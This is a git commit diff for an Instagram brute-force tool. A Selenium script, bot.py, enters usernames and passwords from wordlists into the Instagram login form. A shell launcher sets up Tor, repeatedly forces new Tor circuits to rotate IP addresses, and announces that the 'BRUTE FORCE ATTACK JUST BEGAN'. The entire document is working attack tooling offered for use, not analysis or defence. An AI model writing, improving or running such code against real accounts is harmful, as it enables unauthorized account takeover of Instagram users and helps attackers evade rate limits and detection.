51e7330279eb377abf7317c192aa36d8b6096c9b
YURIN <43861005+YurinDoctrine@users.noreply.github.com>
2020-08-22 15:02:45 +0300

    Add files via upload

--- bot.py
+++ bot.py
@@ -5,17 +5,13 @@ from selenium.webdriver.common.keys import Keys
 
 # get instagram page
 driver = webdriver.Chrome()
-driver.get("https://www.instagram.com")
+driver.get("http://www.instagram.com")
 time.sleep(2)
 
 
 # get tags then try pass.txt if succes y'll get redirect into the homepage xD
 username = driver.find_element_by_name('username')
 password = driver.find_element_by_name('password')
-nologin = driver.find_element_by_xpath(
-    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
-login = driver.find_element_by_xpath(
-    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
 user_txt = open('user.txt', 'r')
 for line2 in user_txt:
     username.send_keys(line2)
@@ -27,12 +23,10 @@ for line in pass_lst:
     password.send_keys(Keys.CONTROL, 'a')
     time.sleep(2)
     password.send_keys(line)
-    login.click()
+    password.send_keys(Keys.ENTER)
     time.sleep(1)
     print("Last password tried:", line)
 
-time.sleep(3)
+# turn idle on
 pass_lst.close()
 user_txt.close()
-# end
-driver.close()
--- start.sh
+++ start.sh
@@ -2,11 +2,11 @@
 #if you get any problems with that contact me via > github.com/YurinDoctrine
 #or you just google it :)
 
-
 dependencies() {
 command -v wget > /dev/null 2>&1 || { echo >&2 "wget Not found, installing..."; sudo apt-get install wget -y; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "curl Not found, installing..."; sudo apt-get install curl -y; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip Not found, installing..."; sudo apt-get install unzip -y; }
-command -v python3-pip > /dev/null 2>&1 || { echo >&2 "python3-pip Not found, installing..."; sudo apt-get install python3-pip -y; }
+command -v pip3 > /dev/null 2>&1 || { echo >&2 "python3-pip Not found, installing..."; sudo apt-get install python3-pip -y; }
 command -v tor > /dev/null 2>&1 || { echo >&2 "tor Not found, installing..."; sudo apt-get install tor -y; }
 command -v google-chrome-stable > /dev/null 2>&1 || { echo >&2 "google-chrome-stable Not found, installing..."; wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -; sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list';sudo apt-get update && sudo apt-get install google-chrome-stable -y; }
 command -v chromedriver > /dev/null 2>&1 || { echo >&2 "chromedriver Not found, installing..."; wget https://chromedriver.storage.googleapis.com/84.0.4147.30/chromedriver_linux64.zip; unzip chromedriver_linux64.zip; rm -rf chromedriver_linux64.zip; sudo mv chromedriver /usr/local/bin; }
@@ -15,20 +15,53 @@ command -v chromedriver > /dev/null 2>&1 || { echo >&2 "chromedriver Not found, 
 dependencies
 clear
 
-privatesession() {
-read -p $'\e[1;93mDO YOU WANT OPEN PRIVATE SESSION(RECOMMENDED)? \e[0m' nock 
-if [[ "$nock" == "Y" || "$nock" == "y" || "$nock" == "yes" || "$nock" == "Yes" ]]; then
-printf 'Aight kiddo! :)\e[0m\n'
-printf 'BRUTE FORCE ATTACK JUST BEGAN! \e[1;93m\n' && main
-fi
-if [[ "$nock" == "N" || "$nock" == "n" || "$nock" == "no" || "$nock" == "No" ]]; then
-printf 'BRUTE FORCE ATTACK JUST BEGAN \e[1;91mWITHOUT NO PRIVACY(!) \e[1;93m\n' && main
+
+checktor() {
+
+check=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)
+
+if [[ "$check" -gt 0 ]]; then
+printf "\e[1;91mPlease, check your TOR Connection! Just type \"tor\" or \"service tor start\"\n\e[0m"
+exit 1
 fi
 
 }
 
-#time to execute bot.py
+yuntil() {
+f=1
+until [ $f -gt 99999 ];
+do
+	sleep 7s
+	echo "Killing tor background proccesses..."
+	changeip
+	i=$(( i+1 ))
+done
+}
+
+function changeip() {
+killall -HUP tor
+
+}
+
+
+privatesession() {
+read -p $'\e[1;93mDO YOU WANT OPEN PRIVATE SESSION(RECOMMENDED)? \e[0m' nock 
+if [[ "$nock" == "Y" || "$nock" == "y" || "$nock" == "yes" || "$nock" == "Yes" ]]; then
+printf 'Aight kiddo! :)\e[0m\n'
+printf 'BRUTE FORCE ATTACK JUST BEGAN! \e[1;93m\n' && sudo service tor start && sleep 5s && checktor && main
+fi
+if [[ "$nock" == "N" || "$nock" == "n" || "$nock" == "no" || "$nock" == "No" ]]; then
+printf 'BRUTE FORCE ATTACK JUST BEGAN \e[1;91mWITHOUT NO PRIVACY(!) \e[1;93m\n' && nain
+fi
+
+}
+
 main() {
+yuntil && nain
+
+}
+
+nain() {
 python3 bot.py
 
 }
